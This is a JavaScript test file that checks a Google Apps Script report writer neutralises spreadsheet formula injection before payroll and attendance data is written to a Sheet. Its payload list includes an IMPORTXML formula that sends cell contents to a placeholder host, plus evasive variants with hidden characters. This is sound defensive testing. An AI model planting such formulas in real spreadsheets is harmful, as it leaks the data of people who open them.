import fs from 'node:fs';
import assert from 'node:assert/strict';
import vm from 'node:vm';

const script=fs.readFileSync('apps_script.gs','utf8');
const match=script.match(/function _sheetLiteralValue\(value\)\{[\s\S]*?\n\}/);
assert.ok(match,'GAS literal-cell sanitizer is defined');
const sanitize=vm.runInNewContext('('+match[0]+')');
assert.equal(typeof sanitize,'function');
const payloads=[
 '=IMPORTXML("https://example.invalid/?cell="&A1,"//title")',
 '=HYPERLINK("https://example.invalid","x")',
 '=1+1',
 ' \t=NOW()',
 '\r\n=INDIRECT("A1")',
 '\uFEFF=IMPORTRANGE("other","A1")',
 '+SUM(A1:A2)',
 '-SUM(A1:A2)',
 '@SUM(A1:A2)',
 '\u200B=1+1'
];
for(const value of payloads){
  assert.equal(sanitize(value),"'"+value,'Formula injection text must be prefixed with literal apostrophe');
}
// Native numeric/boolean/date values, ordinary Korean report values and already-escaped
// text must retain their original types and characters.
const date=new Date('2026-10-12T00:00:00Z');
for(const x of [null,'',0,123,-123,true,false,date,'직원명','정정사유','28:59','2026-10-12',"'+SUM(A1:A2)"]){
  assert.equal(sanitize(x),x,'Non-formula values must not be modified');
}
// Every displayed report cell is sanitized at the actual write boundary.
// A test helper that is not wired into setValues would provide no protection.
assert.match(script,/getRange\(1,1,out\.length,width\)\.setValues\(out\.map\(function\(row\)\{return row\.map\(_sheetLiteralValue\);\}\)\)/);
assert.doesNotMatch(script,/\.setValues\(out\)/);
assert.equal((script.match(/\.setValues\(/g)||[]).length,1,'Any new Sheet writer needs the same sanitization');
// No transformations of payroll amounts, source rows or layout paths.
assert.match(script,/payroll=_withoutPayrollStatusColumns\(payroll\)/);
assert.match(script,/attendance=_sortAttendanceByDate\(_seniorAttendanceLayout\(attendance,payroll\)\)/);
console.log('PASS Apps Script report uses literal cell data; formula and CSV prefixes blocked without amount or layout changes');
